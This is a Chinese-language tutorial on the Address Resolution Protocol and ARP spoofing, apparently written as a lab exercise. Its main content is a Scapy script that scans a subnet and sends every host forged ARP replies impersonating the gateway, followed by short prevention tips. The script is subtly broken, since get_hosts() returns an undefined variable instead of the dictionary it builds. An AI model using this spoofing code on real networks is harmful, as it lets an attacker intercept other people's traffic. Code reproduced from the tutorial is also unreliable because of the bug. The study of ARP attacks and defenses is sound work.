## Address Resolution Protocol

[1]:https://en.wikipedia.org/wiki/Address_Resolution_Protocol
[2]:https://en.wikipedia.org/wiki/Neighbor_Discovery_Protocol
[3]:https://en.wikipedia.org/wiki/Bootstrap_Protocol
[4]:https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol
[5]:http://www.secdev.org/projects/scapy/
[6]:https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure

[Address Resolution Protocol, ARP][1]
地址解析协议的基本功能是通过目标设备的 IP 地址查询它的 MAC 地址,
它是 IPv4 网络层的必要协议 (在 IPv6 中被 [Neighbor Discovery Protocol, NDP][2] 协议取代).

在以太网中, 主机之间使用 MAC 地址进行通讯. 假设有 `host_a` 要与 `host_b` 通信,
它将通过交换机对整个网络进行广播, 然后使用 ARP 找到 `host_b` 的 MAC 地址.
尽管整个广播域都会受到来自于 `host_a` 发送的信息,
但只有被请求的 `host_b` 才会响应 ARP 请求并将自己的 MAC 地址发送给 `host_a`.

`host_a` ARP request:

```
host_a's ip address            :    192.168.1.1
host_a's mac address           :    00:11:22:33:44:55
target (b) ip address          :    192.168.1.2
target (broadcast) mac address :    ff:ff:ff:ff:ff:ff
```

此时表示 `host_a` 向网络内所有主机询问 "192.168.1.2" 是谁的 IP 地址?
不持有该 IP 地址的主机对此不会做出响应,
只有 `host_b` 收到该请求后做出回应表示自己持有该地址并发送自己的 MAC 地址给 `host_a`.

`host_b` ARP response:

```
host_b's ip address             :    192.168.1.2
host_b's mac address            :    aa:bb:cc:dd:ee:ff
target (a) ip address           :    192.168.1.1
target (a) mac address          :    00:11:22:33:44:55
```

此外, 与 ARP 原理相似, 还有 Reverse Address Resolution Protocol, RARP 反向地址解析协议.
它与 ARP 协议使用相同的报头结构, 作用于 ARP 相反, 将 MAC 地址转换为 IP 地址.
由于诸多缺陷, 已经逐渐被
[Bootstrap Protocol, BOOTP][3] 或 [Dynamic Host Configuration Protocol, DHCP][4] 所取代.

<br>

## ARP Spoofing / ARP cache poisoning

所谓 ARP 欺骗属于内网中间人攻击, 基于 ARP 协议的特点, 会使得攻击对整个网络生效,
从而转移原本发往目标主机的数据包.

用来实施 ARP spoofing 的工具很多:
- ARPspoof
- Cain&abel
- Dsniff
- Ettercap
- etc.

在熟悉了 ARP 协议的工作原理和报文结构的基础上, 实验选择使用 Scpay 来模拟攻击.

[Scapy][5] 是一个由 Python 编写的交互式数据包处理程序,
可用来发送, 嗅探, 解析和伪造网络数据包, 常常用于网络攻击和测试中.
可以从其[官方网站][5]下载到最新版本并使用 `sudo python setup.py install` 安装.

_以下实验环境使用操作系统为 Ubuntu 14.04_

Scapy 自带一个 Python shell, 因为部分功能需要 root 权限,
所以如果需要使用 shell 时用 `sudo scapy` 打开.

```py
# 使用 arping() 函数嗅探局域网内指定地址范围内所有主机
#
# arping("192.168.*.1-10/24")
#
# 返回结果如下, 会返回主机的 MAC 地址和 IP 地址.
# finished to send 65536 packets.
# Received 767 packets, got 1 answers, remaining 65535 packets
#   aa:bb:cc:dd:ee:ff    192.168.1.1

# 基于 arping() 首先我们就可以实现函数 get_hosts() 探测局域网内主机并返回地址
##########################

# file simple_arp.py

import time
import sys
import re

from scapy.all import arping, ARP, send


STDOUT = sys.stdout
IPADDR = '10.0.0.*'
GATEWAY_IP = '10.0.0.1'
GATEWAY_MAC = 'aa:bb:cc:dd:ee:ff'


def arp_hack(mac, ip):
    p = ARP(op=2, hwsrc=GATEWAY_MAC, psrc=GATEWAY_IP)
    p.hwdst = mac
    p.pdst = ip
    send(p)


def get_hosts():
    address = {}

    sys.stdout = open('host.info', 'w')
    arping(IPADDR)
    sys.stdout = STDOUT

    with open('host.info', 'r') as hosts:
        info = hosts.readlines()

    for host in info:
        tmp = re.split(r'\s+', host)
        if len(tmp) != 4:
            continue
        address[tmp[1]] = tmp[2]

    return mac_ip

if __name__ == '__main__':
    for mac_addr, ip_addr in get_hosts().items():
        arp_hack(mac=mac_addr, ip=ip_addr)
        time.sleep(1)
```

使用 `ls()` 函数可以显示所有支持的数据包对象, 然后指定任意一个具体包作为参数则显示该包具体结构.
以 `ARP` 包为例, 每个字段内容对应为 [ARP 协议封包结构][6] 的相应字段:

```
in Python shell

>>>ls(ARP)

hwtype     : XShortField          = (1)
ptype      : XShortEnumField      = (2048)
hwlen      : ByteField            = (6)
plen       : ByteField            = (4)
op         : ShortEnumField       = (1)
hwsrc      : ARPSourceMACField    = (None)
psrc       : SourceIPField        = (None)
hwdst      : MACField             = ('00:00:00:00:00:00')
pdst       : IPField              = ('0.0.0.0')
```

- `hwtype` : 对应 "HTYPE", 网络类型, `1` 为 Ethernet
- `ptype` : 对应 "PTYPE", 解析协议类型, `0x0800` 为 IPv4, `0x0806` 为 ARP
- `hwlen` : 对应 "HLEN", MAC 地址长度 6 字节
- `plen` : 对应 "PLEN", IP 地址长度 4 字节
- `op` : 对应 "Operation", ARP 数据包类型, `1` 为 request, `2` 为 reply
- `hwsrc` : 对应 "SHA", sender 的 MAC 地址
- `psrc` : 对应 "SPA", sender 的 IP 地址
- `hwdst` : 对应 "THA", target 的 MAC 地址
- `pdst` : 对应 "TPA", target 的 IP 地址

于是我们也可以选择手动定义一个完整的 ARP 包:

```py
eth = Ether(src='00:11:22:33:44:55', type=0x0806)
arp = ARP(hwtype=1, ptype=0x0800, op=1,
          hwsrc='00:11:22:33:44:55', psrc='10.0.0.1', pdst='10.0.0.7')

# 关于 scapy 中的 "/" 操作符详细参考文档说明, 这里表示一个底层 Eth 上层 ARP 的操作
pkg = eth/arp
# 将 pkg 广播到局域网
recv = srp1(pkg)

# 可以直接输出结果, 或绘制 PDF 图描述封包结构.
recv.show()

pkg.pdfdump('arp_req.pdf')
recv.pdfdump('arp_rep.pdf')
```

#### 如何预防?

ARP 欺骗虽然危险, 但是比较容易识别.
- 最稳妥的方法是将局域网内所有主机的 ARP 缓存表设为静态 (仅适用于小型网络);
- 或编写脚本不断对比网络中各主机的 APR 缓存表的变化来侦测不正常的变动;
- 使用具备相关安全功能的网络设备.
